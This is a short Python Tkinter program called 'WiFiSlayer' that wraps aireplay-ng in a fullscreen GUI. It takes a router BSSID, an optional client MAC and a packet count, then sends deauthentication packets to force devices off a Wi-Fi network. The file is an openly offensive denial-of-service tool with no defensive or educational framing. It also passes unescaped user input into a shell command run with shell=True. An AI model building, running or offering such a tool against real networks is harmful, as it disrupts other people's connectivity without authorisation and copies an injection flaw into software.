import subprocess
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk

def slay_network():
    target_bssid = bssid_entry.get()
    client_mac = client_mac_entry.get()
    count = count_entry.get()

    if not target_bssid:
        output_label.config(text="Target BSSID is required to slay.")
        return

    if not count:
        count = "10"

    if client_mac:
        command = f"sudo aireplay-ng --deauth {count} -a {target_bssid} -c {client_mac} wlan0"
    else:
        command = f"sudo aireplay-ng --deauth {count} -a {target_bssid} wlan0"

    output_label.config(text="Slaying network... Please wait.")
    subprocess.run(command, shell=True)
    output_label.config(text="Attack completed!")

# --- GUI Setup ---
root = tk.Tk()
root.title("WiFiSlayer")
root.attributes("-fullscreen", True)
root.config(bg="black")

# --- Background Image ---
bg_image = Image.open("/home/Geek/Desktop/WiFiSlayer_Background.jpeg")
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

# Resize image while maintaining aspect ratio
bg_image_ratio = bg_image.width / bg_image.height
screen_ratio = screen_width / screen_height
if bg_image_ratio > screen_ratio:
    new_width = screen_width
    new_height = int(screen_width / bg_image_ratio)
else:
    new_height = screen_height
    new_width = int(screen_height * bg_image_ratio)

bg_image = bg_image.resize((new_width, new_height), Image.Resampling.LANCZOS)
bg_photo = ImageTk.PhotoImage(bg_image)
background_label = tk.Label(root, image=bg_photo)
background_label.place(relwidth=1, relheight=1)

# --- Title ---
title_label = tk.Label(root, text="WiFi Slayer", bg="black", fg="green", font=("Arial", 48, "bold"))
title_label.place(relx=0.5, rely=0.05, anchor="n")

# --- UI Frame Positioned Low ---
frame = tk.Frame(root, bg="black")

# Place frame lower on screen using relx and rely
frame.place(relx=0.5, rely=0.95, anchor="center")  # 0.75 = 75% from top

tk.Label(frame, text="Target BSSID (Router MAC):", bg="black", fg="green", font=("Arial", 12)).pack(pady=5)
bssid_entry = tk.Entry(frame, width=40, font=("Arial", 12))
bssid_entry.pack(pady=5)

tk.Label(frame, text="Client MAC (optional):", bg="black", fg="green", font=("Arial", 12)).pack(pady=5)
client_mac_entry = tk.Entry(frame, width=40, font=("Arial", 12))
client_mac_entry.pack(pady=5)

tk.Label(frame, text="Packets to send (default 10):", bg="black", fg="green", font=("Arial", 12)).pack(pady=5)
count_entry = tk.Entry(frame, width=40, font=("Arial", 12))
count_entry.pack(pady=5)

slay_button = tk.Button(frame, text="Slay the Network", command=slay_network, bg="green", fg="white", font=("Arial", 12, "bold"), width=20)
slay_button.pack(pady=20)

output_label = tk.Label(frame, text="", bg="black", fg="green", font=("Arial", 12, "italic"))
output_label.pack(pady=10)


# --- Run the App ---
root.mainloop()
